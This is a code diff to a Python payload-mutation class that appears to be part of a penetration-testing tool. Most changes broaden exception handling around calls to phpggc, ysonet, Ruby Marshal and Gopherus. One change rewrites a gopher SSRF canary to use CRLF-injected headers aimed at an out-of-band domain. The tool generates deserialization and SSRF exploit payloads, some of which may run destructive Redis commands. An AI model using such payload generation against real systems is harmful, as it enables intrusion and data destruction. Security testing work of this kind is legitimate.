@@ -413,7 +413,7 @@ class PayloadMutation:
         except subprocess.TimeoutExpired:
             print(f"[!] Timeout: {chain}")
             return None
-        except (FileNotFoundError, PermissionError, OSError) as e:
+        except (subprocess.SubprocessError, OSError, UnicodeDecodeError) as e:
             print(f"[!] Could not run php/phpggc: {e}")
             return None
         
@@ -711,9 +711,9 @@ class PayloadMutation:
                     ["ruby", "-e", ruby_script],
                     capture_output=True, text=True, timeout=15,
                 )
-            except (subprocess.TimeoutExpired, FileNotFoundError):
+            except (subprocess.SubprocessError, OSError, UnicodeDecodeError):
                 results.append({
-                    "error": "ruby not found or timed out",
+                    "error": "ruby not found, timed out, or produced undecodable output",
                     "hint": "Install Ruby and ensure 'ruby' is on PATH to generate Marshal payloads",
                     "command": f"ruby -e \"puts Base64.strict_encode64(Marshal.dump(...))\"",
                 })
@@ -773,7 +773,7 @@ class PayloadMutation:
         except subprocess.TimeoutExpired:
             print(f"[!] Timeout: {gadget}")
             return None
-        except (FileNotFoundError, PermissionError, OSError) as e:
+        except (subprocess.SubprocessError, OSError, UnicodeDecodeError) as e:
             print(f"[!] Could not run ysonet: {e}")
             return None
 
@@ -832,6 +832,7 @@ class PayloadMutation:
 
     GOPHERUS_PATH = get_tool_path("gopherus")
 
+
     WRAPPER_TEST_COMMANDS = TEST_COMMANDS
 
     def _mutate_wrapper(self) -> Mutations:
@@ -883,7 +884,7 @@ class PayloadMutation:
                             ["php", self.PHPGGC_PATH, chain, ptype, cmd, "-p", "phar", "-o", "-"],
                             capture_output=True, timeout=15,
                         )
-                    except (subprocess.TimeoutExpired, FileNotFoundError):
+                    except (subprocess.SubprocessError, OSError, UnicodeDecodeError):
                         continue
 
                     if proc.returncode != 0 or not proc.stdout:
@@ -923,7 +924,10 @@ class PayloadMutation:
     def _mutate_wrapper_ssrf(self) -> Mutations:
         oob_domain = get_oob_domain()
         if oob_domain:
-            raw = f"gopher://{oob_domain}:80/_GET%20/oob-ssrf-check%20HTTP/1.1"
+            raw = (
+                f"gopher://{oob_domain}:80/_GET /oob-ssrf-check HTTP/1.1%0D%0A"
+                f"Host: {oob_domain}%0D%0A%0D%0A"
+            )
             b64 = base64.b64encode(raw.encode()).decode()
             canary_payload = self._make_payload("wrapper_ssrf_oob_canary", "gopher/oob-canary", None, b64)
             canary_payload["payload_raw"] = raw
@@ -946,7 +950,7 @@ class PayloadMutation:
                     payload["payload_raw"] = raw
                     payload["note"] = "Generated via Gopherus — review before use, may contain destructive Redis commands"
                     return canary_result + [payload]
-            except (subprocess.TimeoutExpired, FileNotFoundError):
+            except (subprocess.SubprocessError, OSError, UnicodeDecodeError):
                 pass
 
         host = self._extract_host()
